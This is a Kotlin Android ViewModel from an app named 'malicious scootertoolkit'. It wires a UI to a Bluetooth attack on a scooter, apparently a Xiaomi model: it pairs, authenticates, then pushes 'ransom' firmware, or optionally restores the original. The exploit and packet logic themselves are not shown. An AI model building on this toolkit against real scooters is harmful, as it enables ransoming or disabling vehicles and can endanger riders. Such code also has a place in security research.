package com.malicious.scootertoolkit.ui.attacks

import androidx.lifecycle.LiveData
import androidx.lifecycle.MutableLiveData
import androidx.lifecycle.ViewModel
import com.malicious.scootertoolkit.ble.BleMain
import com.malicious.scootertoolkit.xiaomi.RansomPacketsCreator

class AttacksViewModel : ViewModel() {

    private val _connected = MutableLiveData<Boolean>().apply {
        value = BleMain.getInstance()?.isConnected()
    }

    private val _text = MutableLiveData<String>().apply {
        if (BleMain.getInstance()?.isConnected() == true) {
            value = "Device connected!"
            _connected.postValue(true)
        }else {
            value = "Device not connected!"
            _connected.postValue(false)
        }
    }

    val connected: LiveData<Boolean> = _connected
    val text: LiveData<String> = _text



    fun launchAttack(fw: RansomPacketsCreator.Companion.FW){
        BleMain.getInstance()?.register(onSuccess =
        { reg_complete ->
            if(reg_complete){
                _text.postValue("Paired")
                BleMain.getInstance()?.authentication(onSuccess =
                { auth_complete ->
                    if(auth_complete){
                        _text.postValue("Device authenticated!")
                        BleMain.getInstance()?.attack(fw, onProgress =
                        {progress ->
                        if (progress < 99)
                            _text.postValue("Progress: $progress%")
                        else {
                            if (fw == RansomPacketsCreator.Companion.FW.RECOVER) {
                                _text.postValue("Scooter Restored.")
                            }else {
                                _text.postValue("Scooter Attacked.")
                            }
                        }
                        })
                    }else _text.postValue("Authenticating...")
                })
            }else _text.postValue("Press power button after beep") })

    }

}